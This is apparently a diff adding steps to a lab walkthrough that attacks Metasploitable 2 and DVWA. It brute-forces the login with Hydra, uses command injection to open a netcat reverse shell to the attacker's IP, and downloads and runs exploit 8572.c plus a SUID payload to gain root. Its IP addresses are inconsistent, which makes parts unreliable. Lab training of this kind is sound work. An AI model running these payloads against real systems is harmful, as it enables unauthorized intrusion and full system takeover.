@@ -161,7 +161,7 @@ This step focuses on gathering essential network configuration data from the att
 
    The scan output confirms 23 open ports. These ports host various network services (e.g., FTP, SSH, HTTP, MySQL, Telnet) which are often configured with known, exploitable vulnerabilities.
 
-### Step 2: Information gathering
+### Step 2: Ennumuration
 
    After obtaining a preliminary overview of the target, the attacker moves further to know the exact services running on the target system (including types and versions) and other information such as users, shares, and DNS entries. Enumeration prepares a clearer blueprint of the target.
 
@@ -217,7 +217,461 @@ This step focuses on gathering essential network configuration data from the att
     [http://10.0.2.5/dvwa/CHANGELOG.txt](http://10.0.2.5/dvwa/CHANGELOG.txt)
     ```
     ![HTTP Service](/images/changelog.png)
+   
     A quick review of the file's content reveals development notes and modification history.This discovery is highly valuable, as the attacker now has a confirmed **valid username (`admin`)** for the target application, which simplifies the subsequent task of cracking or bypassing the authentication mechanism.
+
+---
+   
+### 💥 Step 3: Gaining Access
+
+The goal of this phase is to gain unauthorized access to the DVWA web application using the information gathered during the enumeration phase.
+
+
+
+1. Having successfully identified a valid username (**`admin`**), we will now prepare to brute-force the login page to discover the corresponding password. The **Hydra** tool requires several pieces of information about the login process to execute the attack effectively.
+
+   But we first need to provide the following data: 
+
+   | Data Point | Value/Source | Notes |
+   | :--- | :--- | :--- |
+   | **Username** | `admin` | Found in the previous step via `CHANGELOG.txt` analysis. |
+   | **Password Wordlist** | `/usr/share/wordlists/rockyou.txt.gz` | A common wordlist containing frequently used passwords. |
+   | **Target Host** | `10.0.2.4` | The target Metasploitable 2 IP address. |
+   | **HTTP Method** | *(To be determined)* | POST or GET. |
+   | **Login Path** | `/dvwa/login.php` | The directory/path to the login script. |
+   | **Request Body** | *(To be determined)* | The parameters used for username/password transmission. |
+   | **Failure Identifier** | *(To be determined)* | A unique string on the login page indicating a failed attempt. |
+   
+   
+   To determine the three missing pieces of information (HTTP Method, Request Body, and Failure Identifier), we must analyze the web application's login submission process:
+   
+   1.  Head back to the browser on the **Attacker Machine (Kali Linux)**.
+   2.  Navigate to the DVWA login page: `http://10.0.2.4/dvwa/login.php`.
+   3.  **Right-click** on the page and select **Inspect Element** (or similar, depending on the browser).
+   4.  In the developer window that appears, select the **Network** tab.
+   5.  To trigger a login request, type **`admin`** as the username, choose a **random password** (e.g., `invalid123`), and then click **Login**.
+   6.  This login attempt will fail, but by looking at the recorded requests in the **Network** tab, we can observe the following critical detail:
+       * **HTTP Method:** The submission uses the **POST** method to send credentials to the server.
+  ![HTTP Method](/images/method.png) 
+      
+2. To accurately configure the brute-force attack, the **exact format and names of the fields** (the Request Body) used to transmit the username and password must be determined. This information is found within the failed login attempt request captured in the **Network** tab.
+
+To do This, in the browser's Developer Tools (still open to the **Network** tab), locate the failed **POST** request that was sent to `/dvwa/login.php`. **Right-click** on this request and select **Edit and Resend** (or similar option like 'View Source' or 'Payload' depending on the browser/tool) and examine the **Request Body** (or POST Data) section of the request.
+
+![POST Payload](/images/payload.png)
+
+In this specific case, the request body is structured as a standard URL-encoded string containing three critical parameters:
+
+username=admin&password=test&Login=Login
+
+3. We must now integrate the identified Request Body structure with Hydra's placeholder syntax.
+
+   1.  Copy the determined Request Body:
+       ```
+       username=admin&password=test&Login=Login
+       ```
+   2.  Replace the placeholder password (`test` in our example) with the special token **`^PASS^`**. This token instructs Hydra to sequentially insert each word from the specified password wordlist into this position during the attack.
+   3.  The final, modified request string for the Hydra command is:
+   
+       ```
+       username=admin&password=^PASS^&Login=Login
+       ```
+
+
+4. To allow Hydra to reliably determine a successful login, we must specify the string that appears on the page only when a login **fails**. We previously observed that after a failed login attempt, the webpage displays the text **“Login failed”**. This specific string will be copied and pasted into the Hydra command as the **failure identifier**.
+
+   ![Login Failed Text](/images/login_failed.png)
+
+5. After identifying all the required components (Username, Wordlist, Target, Method, Path, Request Body, and Failure Indicator), we combine them into a single Hydra command.
+
+The general form for the HTTP POST Form module in Hydra is:
+
+```bash
+sudo hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "<PATH>:<REQUEST_BODY>:<FAILURE_STRING>"
+```
+
+After a short execution time, Hydra successfully identifies the correct password.
+
+
+
+![Excuuting Hydra Command](/images/hydra.png)
+
+**Credentials Found: admin/password**
+
+6. The focus now shifts from authentication bypassing to finding and exploiting vulnerabilities within the authenticated section of the web application.
+
+To ensure the vulnerability is active for demonstration, the web application's security level must be explicitly set to the weakest configuration.
+
+Log in to DVWA using the cracked credentials (**`admin/password`**). Navigate to the **DVWA Security** page (usually found in the sidebar).Set the **Security Level** dropdown menu to **Low** then click **Submit** to save the changes.
+
+![Excuuting Hydra Command](/images/dvwa_security.png)
+
+7.We will now test the "Command Execution" module to understand how the web application processes user input.
+
+Navigate to the **Command Execution** page in the DVWA sidebar. In the input field, enter a public, known IP address (e.g., `8.8.8.8`).Click **Submit**.
+
+![Excuuting Hydra Command](/images/cmd_injection.png)
+
+
+8.The Linux command separator (semicolon `;`) allows multiple commands to be executed sequentially on a single line. We use this feature to confirm the presence of a **Command Injection** vulnerability.
+
+The goal is to inject a second, non-ping command (`ls -l`) to prove that the user input is being executed directly by the operating system shell.
+
+   1.  In the Command Execution input field, enter the following payload:
+       ```
+       8.8.8.8 ; ls -l
+       ```
+   2.  Click **Submit**.
+
+   ![Excuuting Hydra Command](/images/cmdi_vulnerability.png)
+      
+   The output displays both the results of the initial `ping -c 3 8.8.8.8` and the directory listing generated by the injected command `ls -l`.
+
+
+9. Exploiting this vulnerability allows us to run arbitrary commands, which can be used to gather critical information about the victim machine's user context, permissions, and internal configuration.
+
+**Goal:** Determine the username, User ID (UID), and Group ID (GID) under which the vulnerable web service is running.
+
+1.  To determine the username, remotely inject the **`whoami`** command:
+    ```bash
+    8.8.8.8 ; whoami; id
+    ```
+2.  To determine the User ID and Group ID, remotely inject the **`id`** command:
+    ```bash
+    8.8.8.8 ; id
+    ```
+    * **Result:** This will output the effective username and the full user identity string, including the UID and GID (e.g., `uid=33(www-data) gid=33(www-data) groups=33(www-data)`).
+
+    ![Excuuting Hydra Command](/images/exploiting_cmdi.png)
+   
+      
+
+This information is vital for understanding the attacker's privilege level on the victim system.
+
+10. Obtaining a Reverse Shell:The objective of this phase is to establish a persistent, interactive command-line session (a **reverse shell**) on the victim machine. This method is more efficient for command execution than relying on the vulnerable web application interface.
+
+A **reverse shell** is a connection initiated by the victim machine back to the attacker machine, granting the attacker a shell session. We will use the versatile **Netcat (`nc`)** utility for this task.
+
+
+The first action is to prepare the attacker machine (Kali Linux) to **listen** for the incoming connection from the victim.
+
+   1.  On the **Attacker Machine (Kali Linux)**, open a new terminal window.
+   2.  Execute the following command to start the Netcat listener on port `1234`:
+   
+       ```bash
+       $ nc -vv -l -p 1234
+       ```
+
+
+   | Option | Description |
+   | :--- | :--- |
+   | `nc` | The Netcat command-line utility. |
+   | `-vv` | **Very Verbose.** Increases the verbosity level, providing detailed output of the connection status. |
+   | `-l` | **Listen Mode.** Instructs Netcat to enter listening mode, waiting for an incoming connection rather than initiating one. |
+   | `-p 1234` | **Port Specification.** Defines the specific TCP port (`1234`) on which the program will listen for the victim's connection. |
+
+The terminal will now display a message indicating it is listening, and it will remain active, waiting for the connection to be initiated from the victim in the next step.
+
+
+11. With the Netcat listener active on the attacker machine, the next step is to use the Command Injection vulnerability to force the victim machine (Metasploitable 2) to connect back and establish the shell session.
+
+
+   1.  Navigate back to the **Command Execution** page in DVWA.
+   2.  In the input field, inject the following payload, using the semicolon (`;`) separator:
+   
+       ```bash
+       8.8.8.8 ; nc -e /bin/sh 10.0.2.15 1234
+       ```
+   
+   3.  Click **Submit**.
+
+   | Command Part | Value | Description |
+   | :--- | :--- | :--- |
+   | `8.8.8.8 ;` | Separator | Executes the initial `ping` command, then executes the second command. |
+   | `nc` | Netcat | Starts the Netcat utility on the victim machine. |
+   | `-e /bin/sh` | Execute | Specifies the file to execute after a successful connection. This provides the attacker with an interactive shell (`/bin/sh`). |
+   | `10.0.2.7` | Attacker IP | The IP address of the Kali Linux machine where the listener is running. |
+   | `1234` | Listener Port | The specific port the attacker is listening on. |
+
+
+Immediately after submission:
+
+* On the **Attacker Machine (Kali Linux)**, the terminal running the Netcat listener (`nc -vv -l -p 1234`) will display a notification message showing a **successful connection** from the victim machine (`10.0.2.4`) to the attacker machine (`10.0.2.15`).
+* The attacker's shell window is now an interactive command prompt on the victim system.
+
+![Excuuting Hydra Command](/images/nc.png)
+
+
+12. With the reverse shell successfully established on the attacker machine, you now have direct, persistent access to the victim's command line. This allows for rapid and efficient enumeration of the host system.
+
+
+In the opened reverse shell window on the Kali Linux machine, we could execute the following command:
+
+* `lsb_release -a` $\rightarrow$ Provides detailed **distribution and release information** for the operating system.
+
+![Excuuting Hydra Command](/images/nc_listening.png)
+
+
+Based on the execution of these commands on the Metasploitable 2 target, you should obtain the following key results:
+
+   **System Distribution and Kernel Version of the Victim Host:**
+    * **Distribution:** **Ubuntu**
+    * **Kernel Version:** The output of `uname -a` will show a version string typically starting with **`2.6.24`** or similar (confirming the findings from the earlier `nmap -A` scan). The output of `lsb_release -a` will confirm the full distribution name, such as `Ubuntu 8.04`.
+
+12. Having gained a user-level shell (running as `www-data`), the next critical step is to assess the current privilege level and determine if **privilege escalation** is necessary to achieve full control of the victim system.
+
+To prove that the current user lacks enough privileges for high-level system access, attempt to read a highly restricted, root-owned system file: `/etc/shadow`.
+
+
+
+   In the opened reverse shell window on the Kali Linux attacker machine, execute the following command:
+    ```bash
+    cat /etc/shadow
+    ```
+
+    
+   ![Excuuting Hydra Command](/images/privilege_missing.png)
+
+    * The command will **fail**.
+    * **No content** from the `/etc/shadow` file will be displayed in the terminal.
+    * The shell may immediately return to the prompt or display a "Permission denied" error (though often in a non-interactive shell like this, it simply produces no visible output).
+
+The execution failure confirms that the current user (`www-data`) does not have the necessary permissions (i.e., is **not root**) to read protected system files.
+
+
+---
+
+### ⬆️ Step 4: Escalating Privileges
+
+Having confirmed that the current shell runs with insufficient privileges (`www-data`), the focus shifts to **Privilege Escalation**. This is typically achieved by exploiting known vulnerabilities in the victim's operating system kernel or installed software.
+
+
+1. The target's operating system and kernel version are confirmed as **Linux 2.6.24** running on **Ubuntu 8.04**. We use this specific version information to search public exploit databases for a suitable vulnerability.
+
+
+   Several methods can be used to search for exploits, including:
+   * Searching with the open-source tool **`searchsploit`** (installed on Kali Linux).
+   * Searching directly on the **Exploit-DB.com** website.
+   * Searching using a general search engine like Google.
+
+
+
+   We execute a refined `searchsploit` command on the Kali terminal to filter the large database specifically for Linux kernel 2.6 privilege escalation exploits:
+   
+   ```bash
+   $ searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
+   ```
+   ![Excuuting Hydra Command](/images/search_for_vuln.png)
+
+
+   Among the available exploit we will select the file 8572.c which exploits a vulnerability in the UDEV device manager that allows code execution via an unverified Netlink message.
+
+2. Before using the exploit, its exact location on the attacker machine must be determined. Exploit files found via `searchsploit` are typically stored in the `/usr/share/exploitdb/exploits/` directory.
+
+
+   1.  First, ensure the local file database is up-to-date for accurate searching:
+       ```bash
+       $ sudo updatedb
+       ```
+   2.  Next, use the `locate` command to find the file:
+       ```bash
+       $ locate 8572.c
+       ```
+
+
+It is a crucial security practice to review the contents of any exploit code before compilation and execution. This allows the attacker to understand the exploit's functionality, dependencies, and any specific instructions from the author.
+
+
+    Use the `cat` command with the full path to display the source code:
+    ```bash
+    $ cat /usr/share/exploitdb/exploits/linux/local/8572.c
+    ```
+
+    ![Excuuting Hydra Command](/images/8572_content.png)
+
+
+The compiled C exploit file (`8572.c`) must be transferred from the Attacker Machine (Kali) to the Victim Machine (Metasploitable 2) for local execution. The simplest method is using the **HTTP protocol** by momentarily serving the file from Kali's internal web server.
+
+
+3. The Kali Linux machine includes the **Apache2** web server, which we will use to temporarily host the exploit file.
+
+   1.  Start the Apache2 service:
+       ```bash
+       $ sudo service apache2 start
+       ```
+   2.  Check the service status to ensure it is running correctly:
+       ```bash
+       $ sudo service apache2 status
+       ```
+
+       ![Excuuting Hydra Command](/images/start_apache2.png)
+    
+
+The exploit file is currently located deep within the `/usr/share/exploitdb/` directory. We will create a **symbolic link** to make it accessible within the Apache document root (`/var/www/html`).
+
+    Create a symbolic link named `local` inside the web root, pointing to the directory containing the exploit:
+    ```bash
+    $ sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html
+    ```
+    **Result:** The exploit file is now accessible via the URL `http://10.0.2.15/local/8572.c`.
+
+
+
+4. The chosen UDEV exploit (`8572.c`) requires specific file paths to execute its payload. The exploit is designed to execute the file `/tmp/run` with root privileges.
+
+   1.  Before downloading the exploit, use the **reverse shell** to change the working directory on the victim machine to the temporary directory `/tmp`.
+       ```bash
+       $ cd /tmp
+       ```
+   2.  Confirm the directory change:
+       ```bash
+       $ pwd
+       ```
+       ![Excuuting Hydra Command](/images/change_dir.png)
+
+
+5. Using the Command Injection vulnerability (which is still active via the reverse shell), instruct the victim machine to download the exploit using the `wget` utility.
+
+       Execute the following commands in the **reverse shell window**:
+       ```bash
+       $ wget [http://10.0.2.7/local/8572.c](http://10.0.2.7/local/8572.c)
+       $ ls -al 8572.c
+       ```
+      ![Excuuting Hydra Command](/images/install_8572.png)
+
+
+
+6.  The downloaded file (`8572.c`) is C source code and must be compiled into a binary executable file before it can be run on the victim system.
+
+   1.  Use the `gcc` compiler on the reverse shell (still in the `/tmp` directory) to compile the code:
+       ```bash
+       $ gcc -o exploit 8572.c
+       ```
+       * **`gcc`:** The GNU Compiler Collection.
+       * **`-o exploit`:** Specifies the output file name as `exploit`.
+   2.  Verify the compilation was successful and check the file permissions:
+       ```bash
+       $ ls -al exploit
+       ```
+       ![Excuuting Hydra Command](/images/cvt_8572_2_compiled.png)
+    
+
+7. Determining the Target Process ID (PID)
+
+The UDEV exploit requires the Process ID (PID) of the **Netlink socket** as an argument. The exploit documentation indicates this PID is usually $\text{UDEVD PID} - 1$.
+
+   1.  Read the content of the Netlink status file to find the non-zero PID:
+       ```bash
+       $ cat /proc/net/netlink
+       ```
+       ![Excuuting Hydra Command](/images/PID_netlink_socket.png)
+       
+       Locate the only non-zero PID displayed. In this example, the required PID is **`2410`**.
+   
+   2.  Verify the PID by checking the running UDEVD process:
+       ```bash
+       $ ps aux | grep udev
+       ```
+       ![Excuuting Hydra Command](/images/PID_udev_process.png)
+       * **Observation:** The PID of the `udevd` process should be `2411`, which is one greater than the identified Netlink PID (`2410`). This confirms the target PID for the exploit.
+
+8. Creating the Privilege Escalation Payload
+
+The `8572.c` exploit is designed to execute the file `/tmp/run` with root privileges. Therefore, we must create this file and populate it with the commands we want executed as root.
+
+**Goal:** Create `/tmp/run` to set the **SUID bit** on a copy of the shell, ensuring any future execution of that copy runs as root.
+
+   1.  Create and populate the `/tmp/run` file using `echo` and redirection:
+       ```bash
+       $ echo "#!/bin/bash" > /tmp/run
+       $ echo "cp /bin/bash /bin/myshell" >> /tmp/run
+       $ echo "chmod +s /bin/myshell" >> /tmp/run
+       ```
+       * The payload copies the `/bin/bash` shell to a new file, `/bin/myshell`.
+       * It then sets the **SUID bit** (`chmod +s`) on `/bin/myshell`. When a file with the SUID bit is run by any user, it executes with the privileges of the file's owner (which will be `root` once the exploit runs).
+   
+   2.  Display the content of the created payload file for verification:
+       ```bash
+       $ cat /tmp/run
+       ```
+      ![Excuuting Hydra Command](/images/creat_run.png)
+
+9. With the executable compiled and the payload created, the final step is to execute the exploit using the identified Netlink PID as the argument.
+
+   Execute the exploit binary:
+    ```bash
+    $ ./exploit 2410
+    ```
+    * **Result:** The exploit runs, leverages the UDEV vulnerability, and successfully executes the `/tmp/run` script with root privileges. This means `/bin/myshell` now exists and has the SUID bit set by the root user.
+
+
+10. Before execution, verify the attributes of the shell copied and modified by the payload (`/tmp/run`).
+
+
+    Execute the following command in the reverse shell:
+    ```bash
+    $ ls -al /bin/myshell
+    ```
+     ![Excuuting Hydra Command](/images/exc_exploit.png)
+
+* **Observation:** The output confirms the following critical attributes:
+    * **Owner:** The file is owned by **`root`**.
+    * **Permissions/SUID:** The permission string will show an **`s`** where the owner's execute permission is located (e.g., `-rwsr-xr-x`). This letter confirms the **setuid (SUID) attribute** is successfully set. 
+
+11. The SUID shell must be executed with a specific option to prevent the Linux kernel from automatically dropping the elevated privileges.
+
+**Goal:** Run the new shell and maintain the root effective user ID.
+
+    Execute the SUID shell with the **`-p`** option:
+    ```bash
+    $ /bin/myshell -p
+    ```
+    * **`-p` Option:** This flag is crucial; it prevents the shell from reverting the **effective GID and UID** back to the real (low-privilege) GID and UID, thereby preserving the root privilege.
+
+
+12. After executing the SUID shell, the session should now be running with the highest possible privileges.
+
+
+    Execute the following commands in the newly opened shell session:
+    ```bash
+    $ id
+    $ whoami
+    ```
+    ![Excuuting Hydra Command](/images/verify_exploit_works.png)
+
+* **Final Result:**
+    * The output of **`whoami`** will be **`root`**.
+    * The output of **`id`** will show **`uid=0(root)`** and **`gid=0(root)`**.
+
+   This confirms that the privilege escalation was successful, and the attacker now has complete control of the Metasploitable 2 victim system.
+   
+   13. While the execution of `/bin/myshell -p` successfully elevated the Effective User ID (EUID) to `root` (UID 0), the shell environment itself might still be limited or unstable. Generally, the **EUID mirrors the Real User ID (RUID)**, except when a **SetUID binary** is executed, which temporarily elevates the EUID.
+   
+   To ensure a persistent and fully functional shell environment with guaranteed root privileges, we will execute a final command using Python.
+   
+   
+   This command imports the `os` module in Python to explicitly set both the Real and Effective User IDs to `0` (`root`), and then executes a persistent Bash shell (`/bin/bash -p`).
+   
+   **Goal:** Establish a permanent, stable, and fully privileged Bash session by explicitly setting the UID to 0.
+   
+       In the current root-privileged shell session, execute the following Python command:
+       ```bash
+       $ python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
+       ```
+   
+   #### A. Command Breakdown
+   
+   | Command Part | Function | Significance |
+   | :--- | :--- | :--- |
+   | `python -c` | Execute code | Executes the following commands directly via the Python interpreter. |
+   | `import os;` | Import module | Imports the standard operating system interface module. |
+   | `os.setuid(0);` | Set UID to Root | **Crucially sets the Real User ID (RUID) to 0 (root).** This ensures the session is no longer merely using an *effective* ID, but a *real* root ID. |
+   | `os.system("/bin/bash -p")` | Execute Shell | Executes a new Bash shell. The **`-p`** flag ensures that the shell retains the privileges granted by the SetUID mechanism (in this case, the `os.setuid(0)` call). |
+   
+   
+   ![Excuuting Hydra Command](/images/python.png)
+   
+   You now have a stable, full-featured Bash shell running with the highest possible privilege level (`root`). You can proceed with any post-exploitation activities.
 
 
 
